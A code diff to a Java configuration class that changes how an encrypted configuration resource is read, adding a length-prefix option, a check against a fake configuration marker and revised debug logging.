@@ -78,10 +78,16 @@ public final class Conf {
      * The Constant ENDOF_CONF_DELIMITER. Marker di fine configurazione
      */
     public static final String ENDOF_CONF_DELIMITER = "ENDOFCONFS-";
-    private static final byte[] FAKECONFSTART = new byte[] { (byte) 0x85, 0x22,
-            (byte) 0xa0, 0x14, 0x28, 0x09, 0x55, (byte) 0xec, (byte) 0xb7,
-            (byte) 0xf8, (byte) 0xa5, 0x6d, (byte) 0x87, (byte) 0x86,
-            (byte) 0xc8, 0x3f };
+    /*
+     * private static final byte[] FAKECONFSTART = new byte[] { (byte) 0x85,
+     * 0x22,
+     * (byte) 0xa0, 0x14, 0x28, 0x09, 0x55, (byte) 0xec, (byte) 0xb7,
+     * (byte) 0xf8, (byte) 0xa5, 0x6d, (byte) 0x87, (byte) 0x86,
+     * (byte) 0xc8, 0x3f };
+     */
+
+    public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
+            .getBytes();
 
     /**
      * Crc verify.
@@ -215,12 +221,12 @@ public final class Conf {
             //#ifdef DBC
             Check.asserts(inputStream != null, "Resource config");
             //#endif            
-            ret = loadCyphered(inputStream, confKey);
+            ret = loadCyphered(inputStream, confKey, true);
 
-            //#ifdef DEBUG
+            //#ifdef FAKE323
             if (ret == false) {
                 inputStream = InstanceConfig.getConfig323();
-                ret = loadCyphered(inputStream, confKey);
+                ret = loadCyphered(inputStream, confKey, true);
             }
             //#endif
 
@@ -241,6 +247,7 @@ public final class Conf {
      * @param realLen
      * @param confKey
      *            the conf key
+     * @param offset
      * @return true, if successful
      */
     public boolean loadCyphered(final byte[] cyphered, final int len,
@@ -261,13 +268,6 @@ public final class Conf {
         debug.trace("plain len: " + plainconf.length);
         //#endif
 
-        if(plainconf[0] != 0 || plainconf[1] != 0){
-            //#ifdef DEBUG_ERROR
-            debug.error("wrong key");
-            //#endif
-            return false;
-        }
-        
         // lettura della configurazione
         ret = parseConf(plainconf, 0);
 
@@ -283,12 +283,34 @@ public final class Conf {
      *            the conf key
      * @return true, if successful
      */
-    public boolean loadCyphered(final InputStream i0, final byte[] confKey) {
+    public boolean loadCyphered(final InputStream i0, final byte[] confKey,
+            boolean explicitSize) {
         int len;
         boolean ret = false;
 
         try {
-            len = i0.available();
+            if (explicitSize) {
+                byte[] lenArray = new byte[4];
+                i0.read(lenArray);
+                len = Utils.byteArrayToInt(lenArray, 0);
+                if (Arrays.equals(lenArray, 0, FAKECONFSTART, 0,lenArray.length)) {
+                    //#ifdef ERROR
+                    debug.error("Fake configuration");
+                    //#endif
+                    return false;
+                }
+
+                //#ifdef DEBUG_TRACE
+                debug.trace("explicitSize: len:" + len);
+                //#endif
+            } else {
+                len = i0.available();
+            }
+
+            //#ifdef DEBUG_INFO
+            debug.info("config len:" + len);
+            //#endif
+
             final byte[] cyphered = new byte[len];
             i0.read(cyphered);
 
@@ -300,12 +322,11 @@ public final class Conf {
                 return false;
             }
 
-            int realLen = Utils.byteArrayToInt(cyphered, 0);
-            //#ifdef DEBUG
-            debug.trace("config len: " + realLen);
+            //#ifdef DEBUG_INFO
+            debug.info("config len: " + len);
             //#endif
 
-            ret = loadCyphered(cyphered, realLen, confKey);
+            ret = loadCyphered(cyphered, len, confKey);
 
         } catch (final IOException e) {
             //#ifdef DEBUG
